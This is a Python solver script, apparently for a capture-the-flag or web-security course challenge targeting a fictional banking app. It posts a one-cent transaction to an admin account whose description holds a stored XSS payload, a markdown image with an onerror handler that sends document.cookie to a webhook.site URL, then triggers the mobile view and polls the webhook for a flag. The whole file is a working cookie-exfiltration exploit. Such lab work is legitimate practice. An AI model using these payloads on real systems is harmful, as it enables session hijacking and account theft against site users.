import sys
from pathlib import Path
sys.path.append(str(Path(__file__).resolve().parent.parent))
from utils import get_session, find_flag

import json

BASE_URL = "https://netquocca.quoccacorp.com"
API_BASE_URL = "https://api.netquocca.quoccacorp.com"
MOBILE_URL = "https://m.netquocca.quoccacorp.com"

class Solver:
    def __init__(self):
        self.session = get_session()
        self.webhooksite_uuid = self.get_webhooksite_uuid()
        self.webhooksite_url = f"https://webhook.site/{self.webhooksite_uuid}"
        self.webhooksite_view_url = f"https://webhook.site/#!/view/{self.webhooksite_uuid}"
        self.webhooksite_requests_url = f"https://webhook.site/token/{self.webhooksite_uuid}/requests"
        print(self.webhooksite_view_url)

    def get_webhooksite_uuid(self):
        response = self.session.post("https://webhook.site/token")
        return response.json()["uuid"]

    def find_flag_webhooksite(self, delay_seconds=2):
        import time, json
        time.sleep(delay_seconds)
        response = self.session.get(self.webhooksite_requests_url)
        response_json = response.json()
        response_json_text = json.dumps(response_json, indent=2)
        find_flag(response_json_text)

    def main(self):
        # List Accounts
        response = self.session.get(f"{API_BASE_URL}/accounts")
        account = response.json()["accounts"][0]
        bsb, account_number, balance = account["bsb"], account["account_number"], account["balance"]
        print(account)

        PAYLOAD = f'''![a]("onerror="fetch(`{self.webhooksite_url}?q=${{document.cookie}}`))'''
        PAYLOAD = f'''![a]("onerror="document.location='{self.webhooksite_url}?q='+document.cookie)'''

        print(PAYLOAD)

        ADMIN_BSB = "069-420"
        ADMIN_ACCOUNT_NUMBER = "00000000"

        response = self.session.post(f"{API_BASE_URL}/transactions", json={
            "from_account": { "bsb": bsb, "account_number": account_number },
            "to_account": { "bsb": ADMIN_BSB, "account_number": ADMIN_ACCOUNT_NUMBER },
            "description": PAYLOAD,
            "amount": 0.01
        })

        response = self.session.get(f"{API_BASE_URL}/transactions")
        transaction_id = response.json().get("transactions")[0].get("id")
        response = self.session.get(f"{MOBILE_URL}", params={ "transaction": transaction_id })
        print(response.text)

        self.find_flag_webhooksite()

if __name__ == "__main__":
    Solver().main()
